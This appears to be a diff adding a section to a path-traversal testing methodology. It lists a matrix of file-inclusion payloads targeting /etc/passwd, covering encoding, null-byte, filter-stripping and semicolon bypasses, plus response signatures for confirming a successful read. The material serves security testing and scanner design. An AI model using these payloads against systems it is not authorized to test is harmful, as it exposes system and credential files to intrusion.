@@ -40,6 +40,70 @@ nist_csf:
 - **SecLists**: Traversal payload wordlists from Daniel Miessler's collection
 - **curl**: For manual testing of traversal payloads
 
+## Critical: Variants Most Often Missed (test these for EVERY file parameter)
+
+Scanners frequently miss path traversal / LFI because they only try the
+canonical `../../../etc/passwd` and give up when a filter blocks it. For every
+parameter that could reference a file, you MUST try the full matrix below — a
+single blocked payload does not mean the parameter is safe.
+
+```text
+# 1. Raw absolute path — NO traversal at all. Works when the app prepends
+#    nothing or uses include($_GET['x']) directly. THIS IS THE #1 MISS.
+/etc/passwd
+etc/passwd
+file:///etc/passwd
+
+# 2. Leading-slash variants — bypass filters that strip a single "../" or
+#    only block the exact string "/etc/passwd". Extra leading slashes are
+#    normalized to one by most loaders, so //etc/passwd == /etc/passwd.
+//etc/passwd
+///etc/passwd
+////etc/passwd
+/./etc/passwd
+/%2e/etc/passwd
+
+# 3. Classic relative traversal at increasing depth (1–12 levels)
+../etc/passwd ... ../../../../../../../../../../../../etc/passwd
+
+# 4. Filter-stripping bypasses (non-recursive "../" removal)
+....//....//....//etc/passwd
+..././..././..././etc/passwd
+....\/....\/....\/etc/passwd
+
+# 5. Encoding bypasses
+..%2f..%2f..%2fetc%2fpasswd            # single URL-encode
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd    # double URL-encode
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd # overlong UTF-8
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+
+# 6. Trailer / extension-append bypasses
+../../../etc/passwd%00.png             # null byte (PHP < 5.3.4)
+../../../etc/passwd%00
+../../../etc/passwd#
+../../../etc/passwd?
+/etc/passwd%00.jpg
+
+# 7. Path-parameter / semicolon bypasses (Tomcat, some proxies)
+..;/..;/..;/etc/passwd
+```
+
+### How to CONFIRM a hit (avoid false negatives)
+
+Match the response body against these signatures, not just a 200 status or a
+size change:
+
+- `/etc/passwd`  → regex `root:.*?:0:0:` (a root line). Also `daemon:`, `nobody:`.
+- `/etc/hosts`   → `127.0.0.1` plus `localhost`.
+- `/proc/self/environ` → `PATH=` / `HTTP_USER_AGENT=`.
+- Windows `win.ini` → `[fonts]` / `[extensions]` / `for 16-bit app support`.
+- PHP `php://filter` base64 read → a long base64 blob that decodes to `<?php`.
+
+Treat ANY of: a content-length delta vs. a known-bad baseline, a new MIME type,
+or a partial match (e.g. only `root:x:0:0` with the rest truncated) as a
+candidate worth manual confirmation. Do NOT require the literal full file.
+
 ## Workflow
 
 ### Step 1: Identify File Path Parameters
